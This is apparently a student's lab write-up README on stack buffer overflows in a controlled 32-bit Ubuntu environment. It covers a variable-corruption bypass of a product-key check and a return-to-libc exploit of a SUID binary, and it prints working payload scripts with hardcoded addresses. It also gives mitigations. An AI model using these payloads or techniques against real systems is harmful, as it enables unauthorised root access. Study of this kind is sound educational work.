# Buffer Overflow Exploit Lab

**Course:** CIS*6540 Advanced Penetration Testing and Exploit Development  
**Institution:** University of Guelph  
**Date:** May 2026  
**Author:** Sumesh Kumar

---

## Overview

This repository contains two buffer overflow exploits developed as part of a hands-on security research lab. Both exploits demonstrate classic vulnerability exploitation techniques on a controlled Ubuntu 14.04 (32-bit) environment with ASLR disabled.

---

## Lab Environment

- **OS:** Ubuntu 14.04 LTS (32-bit)
- **Compiler Flags:** `-fno-stack-protector -z execstack`
- **ASLR:** Disabled (`kernel.randomize_va_space = 0`)
- **Architecture:** i686 (32-bit Intel)

---

## Task 1: Product Registration Bypass (3 marks)

### Vulnerability
Buffer overflow in `product_register` program due to unchecked `strcpy()` call.

### Exploit Type
**Variable Corruption Attack**

### Technical Details

**Vulnerable Code:**
```c
char usr_key[BUF_LEN];  // BUF_LEN = 32
char rv = 0;
int cmp = 0;
strcpy(usr_key, key);  // No bounds checking!
```

**Stack Layout:**
```
[usr_key: 32 bytes][rv: 1 byte][i: 1 byte][saved_key: 32 bytes][cmp: 4 bytes]
```

**Payload Structure:**
```bash
./product_register abc $(python -c 'print "A"*32 + "\x01"')
```

**Exploitation Steps:**
1. Fill `usr_key` buffer with 32 'A' characters
2. Overflow into `rv` variable with byte value `0x01`
3. When validation fails (`cmp = 1`), function returns `rv` value
4. Main checks `if (rv == 1)` → prints "Product Key Accepted!!!"

**Result:** Successfully bypassed product key validation with invalid input.

---

## Task 2: Privilege Escalation via SUID Binary (7 marks)

### Vulnerability
Buffer overflow in `is_valid_html` SUID binary due to unchecked `strcpy()` in filename extension validation.

### Exploit Type
**Return-to-libc Attack**

### Technical Details

**Vulnerable Code:**
```c
int verify_extension(char* fname) {
  char extension[16];
  strcpy(extension, ptr_fname);  // Overflow point
  return strcmp("html", extension);
}
```

**System Information:**
- `system()` address: `0xb7e53310`
- `/bin/sh` string: `0xb7f75d4c`
- SUID bit set (program runs as root)

**Payload Structure:**
```bash
./is_valid_html test.$(python -c "print 'A'*32 + '\x10\x33\xe5\xb7' + 'AAAA' + '\x4c\x5d\xf7\xb7'")
```

**Breakdown:**
- `'A'*32` - Padding to reach return address
- `\x10\x33\xe5\xb7` - Address of `system()` (little-endian)
- `'AAAA'` - Dummy return address
- `\x4c\x5d\xf7\xb7` - Address of "/bin/sh" string (little-endian)

**Exploitation Mechanism:**
1. Overflow `extension[16]` buffer through filename parameter
2. Overwrite function return address with `system()` address
3. Place "/bin/sh" address as first argument on stack
4. Function returns → jumps to `system("/bin/sh")`
5. Because binary has SUID root, shell spawns with root privileges

**Result:** Successfully obtained root shell (`uid=0`).

---

## Exploit Scripts

### prod_register.sh
```bash
#!/bin/bash
# Sumesh Kumar
./product_register abc $(python -c 'print "A"*32 + "\x01"')
```

### validate_html.sh
```bash
#!/bin/bash
# Sumesh Kumar
# Return-to-libc exploit for is_valid_html

./is_valid_html test.$(python -c "print 'A'*32 + '\x10\x33\xe5\xb7' + 'AAAA' + '\x4c\x5d\xf7\xb7'")
```

---

## Key Learnings

### Technical Skills Acquired
- Stack-based buffer overflow exploitation
- GDB debugging and memory analysis
- Return-to-libc attack methodology
- SUID binary privilege escalation
- x86 assembly and calling conventions
- Little-endian address encoding

### Security Concepts
- Importance of input validation and bounds checking
- Dangers of unsafe C functions (`strcpy`, `gets`, etc.)
- Stack memory layout and function call mechanics
- Privilege escalation through SUID vulnerabilities
- Defense mechanisms (stack canaries, ASLR, NX bit)

### Tools Used
- **GDB** - Debugging and memory inspection
- **Python** - Payload generation
- **objdump** - Binary analysis
- **strace** - System call tracing

---

## Mitigation Strategies

### Preventing Similar Vulnerabilities

1. **Use Safe Functions:**
   - Replace `strcpy()` with `strncpy()` or `strlcpy()`
   - Use `fgets()` instead of `gets()`
   - Enable compiler warnings (`-Wall -Wextra`)

2. **Compiler Protections:**
   - Stack canaries (`-fstack-protector-all`)
   - Non-executable stack (`-z noexecstack`)
   - Address Space Layout Randomization (ASLR)
   - Position Independent Executables (PIE)

3. **Code Practices:**
   - Input validation and sanitization
   - Bounds checking on all buffer operations
   - Principle of least privilege (avoid SUID when possible)
   - Regular security audits and code reviews

---

## Disclaimer

⚠️ **Educational Purpose Only**

These exploits were developed in a controlled lab environment for educational purposes as part of a graduate-level cybersecurity course. The techniques demonstrated should only be used in authorized testing environments with proper permission.

**Do not use these techniques on systems you do not own or have explicit authorization to test.**

---

## Repository Structure

```
buffer-overflow-lab/
├── README.md                  # This file
├── prod_register.sh          # Task 1 exploit script
├── validate_html.sh          # Task 2 exploit script
├── prod_register.jpg         # Task 1 screenshot
└── validate_html.jpg         # Task 2 screenshot
```

---

## References

1. Aleph One, "Smashing The Stack For Fun And Profit" (1996)
2. OWASP Buffer Overflow Guide
3. "The Shellcoder's Handbook" - Koziol et al.
4. "Hacking: The Art of Exploitation" - Jon Erickson

---

**License:** Educational Use Only  
**Contact:** sumeshkumar1901@gmail.com  
**GitHub:** github.com/prashersumesh  
**LinkedIn:** linkedin.com/in/sumeshkumar1901
